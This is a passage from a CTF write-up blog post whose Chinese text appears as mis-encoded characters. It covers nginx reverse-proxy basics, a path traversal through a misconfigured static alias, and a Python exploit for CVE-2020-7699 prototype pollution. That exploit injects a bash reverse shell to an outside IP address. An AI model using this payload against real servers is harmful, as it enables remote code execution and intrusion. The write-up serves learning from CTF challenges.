<span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span></span><br><span class="line">    data = &#123; <span class="string">'passwd'</span>:<span class="string">'bcryptyyds'</span>, &#125;</span><br><span class="line">    header = &#123; <span class="string">"Content-Type"</span> : <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">               <span class="string">"Accept"</span> : <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>,</span><br><span class="line">               <span class="string">"Upgrade-Insecure-Requests"</span> : <span class="string">"1"</span> &#125;</span><br><span class="line">    r = requests.post(url + urllib.quote(i),data=data,headers=header)</span><br><span class="line">    print(i)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªå¾ˆéƒé—·ï¼Œé…ç½®ç¯å¢ƒå¾ˆé•¿æ—¶é—´è¿˜æ˜¯æ²¡èƒ½å¼„å‡ºæ¥</p>
<h2 id="EZnode"><a href="#EZnode" class="headerlink" title="EZnode"></a>EZnode</h2><p>åº”è¯¥æ˜¯å›½èµ›åˆ†åŒºèµ›çš„é¢˜</p>
<h3 id="è€ƒç‚¹-3"><a href="#è€ƒç‚¹-3" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>nginxåå‘ä»£ç†é…ç½®é”™è¯¯</p>
<p>é¦–å…ˆæ¥å­¦ä¹ ä¸€ä¸‹ngnix</p>
<h3 id="ngnix"><a href="#ngnix" class="headerlink" title="ngnix"></a>ngnix</h3><p>ngnixæ˜¯ä¸€æ¬¾è‡ªç”±çš„ã€å¼€æºçš„ã€é«˜æ€§èƒ½çš„HTTPæœåŠ¡å™¨å’Œåå‘ä»£ç†æœåŠ¡å™¨ã€‚</p>
<p>ä¸»è¦åœ¨ä¸‰ä¸ªæ–¹é¢</p>
<ul>
<li>åå‘ä»£ç†</li>
<li>è´Ÿè½½å‡è¡¡</li>
<li>nginxç‰¹ç‚¹</li>
</ul>
<p><strong>åå‘ä»£ç†</strong></p>
<blockquote>
<p>å…ˆè¯´æ­£å‘ä»£ç†</p>
<p>å®¢æˆ·ç«¯éå¸¸æ˜ç¡®è¦è®¿é—®çš„æœåŠ¡å™¨åœ°å€ï¼›æœåŠ¡å™¨åªæ¸…æ¥šè¯·æ±‚æ¥è‡ªå“ªä¸ªä»£ç†æœåŠ¡å™¨ï¼Œè€Œä¸æ¸…æ¥šæ¥è‡ªå“ªä¸ªå…·ä½“çš„å®¢æˆ·ç«¯ï¼›æ­£å‘ä»£ç†æ¨¡å¼å±è”½æˆ–è€…éšè—äº†çœŸå®å®¢æˆ·ç«¯ä¿¡æ¯ã€‚</p>
</blockquote>
<p><img src="/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004160128766.png" alt="image-20201004160128766"></p>
<p>ä¸Šé¢è¿™ä¸ªå›¾å°±å¾ˆå½¢è±¡äº†</p>
<p>å¤šä¸ªå®¢æˆ·ç«¯ç»™æœåŠ¡å™¨å‘é€çš„è¯·æ±‚ï¼ŒnginxæœåŠ¡å™¨æ¥æ”¶åˆ°ä¹‹åï¼Œ</p>
<p>æŒ‰ç…§ä¸€å®šçš„è§„åˆ™åˆ†å‘ç»™äº†åç«¯çš„ä¸šåŠ¡å¤„ç†æœåŠ¡å™¨è¿›è¡Œå¤„ç†äº†ã€‚</p>
<p>æ­¤æ—¶~è¯·æ±‚çš„æ¥æºä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯æ˜¯æ˜ç¡®çš„ï¼Œä½†æ˜¯è¯·æ±‚å…·ä½“ç”±å“ªå°æœåŠ¡å™¨å¤„ç†çš„å¹¶ä¸æ˜ç¡®äº†ï¼Œnginxæ‰®æ¼”çš„å°±æ˜¯ä¸€ä¸ªåå‘ä»£ç†è§’è‰²</p>
<p><strong>è´Ÿè½½å‡è¡¡</strong></p>
<p>åœ¨åå‘ä»£ç†ä¸­</p>
<p>å®¢æˆ·ç«¯ä¼šå‘æœåŠ¡ç«¯å‘å‡ºè¯·æ±‚ï¼Œè€ŒæœåŠ¡å™¨å°†æ¥å—åˆ°çš„è¯·æ±‚æŒ‰ç…§è§„åˆ™åˆ†å‘çš„è¿‡ç¨‹ï¼Œå°±å«åšè´Ÿè½½å‡è¡¡</p>
<p><strong>ngnixé…ç½®</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">main                                # å…¨å±€é…ç½®</span><br><span class="line"> </span><br><span class="line">events &#123;                            # nginxå·¥ä½œæ¨¡å¼é…ç½®</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">http &#123;                                # httpè®¾ç½®</span><br><span class="line">    ....</span><br><span class="line"> </span><br><span class="line">    server &#123;                        # æœåŠ¡å™¨ä¸»æœºé…ç½®</span><br><span class="line">        ....</span><br><span class="line">        location &#123;                    # è·¯ç”±é…ç½®</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        location path &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        location otherpath &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    server &#123;</span><br><span class="line">        ....</span><br><span class="line"> </span><br><span class="line">        location &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    upstream name &#123;                    # è´Ÿè½½å‡è¡¡é…ç½®</span><br><span class="line">        ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‘ç°æœ‰ç›®å½•ç©¿è¶Šæ¼æ´å‚è€ƒ</p>
<p><a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p>
<p>/static../</p>
<p><img src="/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004162700298.png" alt="image-20201004162700298"></p>
<p>ä¹‹åå°±æ˜¯æ‰¾cveäº†ï¼Œæ¯”è¾ƒèœï¼Œåªèƒ½å­¦ä¹ </p>
<p>cve-2020-7699</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">'bash -c "bash -i &amp;&gt; /dev/tcp/39.97.105.125/8080 0&gt;&amp;1"'</span></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">r1 = requests.post(<span class="string">'http://219.219.61.234:20006/y0u_CaNn07_Gu3ss_tHe_pATh'</span>, files = &#123;<span class="string">'__proto__.outputFunctionName'</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">"x;process.mainModule.require('child_process').exec('&#123;&#125;');x"</span>.format(cmd))&#125;)</span><br><span class="line">print(r1.text)</span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">r2 = requests.get(<span class="string">'http://219.219.61.234:20006/'</span>)</span><br><span class="line">print(r2.text)</span><br></pre></td></tr></table></figure>
<p>ä¹‹ååå¼¹shellï¼Œæ‰§è¡Œå‘½ä»¤ã€‚</p>

      </div>
      <div class="post-copyright">
    <p class="copyright-item">
      <span>Author: </span>
      <a href="https://pz1o.top">M1key</a>
    </p>
    <p class="copyright-item">
      <span>Link: </span>
      <a href="https://pz1o.top/2020/09/28/%E5%A4%8D%E7%8E%B0wp/">https://pz1o.top/2020/09/28/%E5%A4%8D%E7%8E%B0wp/</a>
    </p>
    <p class="copyright-item">
      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">çŸ¥è¯†å…±äº«ç½²å-éå•†ä¸šæ€§ä½¿ç”¨ 4.0 å›½é™…è®¸å¯åè®®</a>
    </p>
  </div>
      <footer class="post-footer">
        <div class="post-tags">
            <a href="/tags/WP/">WP</a>
            </div>
        
        <nav class="post-nav"><a class="prev" href="/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">åå¼¹shellæ€»ç»“</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    <a class="next" href="/2020/09/27/BUU%E5%88%B7%E9%A2%98/">
        <span class="next-text nav-default">BUU(Web)</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></footer>
    </article></div><div class="comments" id="comments"></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:pz1olzy@aliyun.com" class="iconfont icon-email" title="email"></a>
        <a href="https://stackoverflow.com" target="_blank" rel="noopener" class="iconfont icon-stack-overflow" title="stack-overflow"></a>
        <a href="https://twitter.com" target="_blank" rel="noopener" class="iconfont icon-twitter" title="twitter"></a>
        <a href="https://google.com" target="_blank" rel="noopener" class="iconfont icon-google" title="google"></a>
        <a href="https://github.com/pz1o" target="_blank" rel="noopener" class="iconfont icon-github" title="github"></a>
        <a href="https://zhihu.com" target="_blank" rel="noopener" class="iconfont icon-zhihu" title="zhihu"></a>
        <a href="https://douban.com" target="_blank" rel="noopener" class="iconfont icon-douban" title="douban"></a>
        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even" target="_blank" rel="noopener">Even</a>
  </span>

  <span class="copyright-year">&copy;2020 - 2021<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">M1key</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
</body>
</html>
